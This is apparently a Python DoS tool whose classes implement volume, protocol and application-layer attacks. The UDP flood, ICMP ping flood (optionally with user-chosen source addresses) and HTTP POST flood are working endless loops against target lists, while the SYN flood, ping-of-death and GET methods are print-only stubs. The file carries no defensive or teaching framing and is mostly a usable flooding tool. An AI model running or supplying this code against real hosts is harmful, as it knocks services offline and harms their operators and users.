import requests as res
import socket as sockk
import time
import ping3
import platform

class VolumeBasedAttack:
    @staticmethod
    def udp_flooding(bye: bytes, vector: list, port: int):
        addr = tuple(vector)
        s = sockk.socket(sockk.AF_INET, sockk.SOCK_DGRAM)
        try: 
            while True:
                for i in addr:
                    s.sendto(bye, (i, port))
        except Exception as e:
            print(f'Error occurred: {e}')
        finally:
            s.close() 

    @staticmethod
    def icmp(vector: list, bye: bytes):
        bye = int(bye)
        if platform.system() == 'Linux':
            wifi = input("In Linux, you can also use wifi in ping mode, do you want to? (y/n) \n")
            if wifi.lower() == 'y':
                for i in vector:
                    ping3.verbose_ping(i, interface='wifi0', size=bye, count=0, interval=0)
            else:
                addre = input("You can also choose a source address, do you want to? (y/n) \n")
                if addre.lower() == 'y':
                    sources = input("Write the IP address(es): \n").split(" ")
                    for i in vector:
                        for ad in sources:
                            ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
                else:
                    for i in vector:
                        ping3.verbose_ping(i, size=bye, count=0, interval=0)

        elif platform.system() == 'Windows':
            response = input("You can choose a source address, do you want to? (y/n) \n")
            if response.lower() == 'y':
                sources = input("Write the IP address(es): \n").split(" ")
                print("ICMP attack with source address ", sources)
                for i in vector:
                    for ad in sources:
                        ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
            else:
                print("No source address selected.\n")
                for i in vector:
                    ping3.verbose_ping(i, size=bye, count=0, interval=0)

class ProtocolAttack:
    @staticmethod
    def syn_flood(vector: list, bye: bytes, port: int):
        print(f"SYN flood attack on {vector} with {len(bye)} bytes")

    @staticmethod
    def pod(vector: list, bye: bytes, port: int):
        print(f"POD attack on {vector} with {len(bye)} bytes")

class ApplicationLayerAttack:
    @staticmethod
    def post(vector: list, bye: bytes):
        print(f"POST attack on {vector} with {len(bye)} bytes")
        print("Using POST method to:", vector)
        print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
        time.sleep(10)
        while True:
            for target in vector:
                response = res.post(target, data=bye)
                print(response.text)

    @staticmethod
    def get(vector: list, bye: bytes):
        print(f"GET attack on {vector} with {len(bye)} bytes")
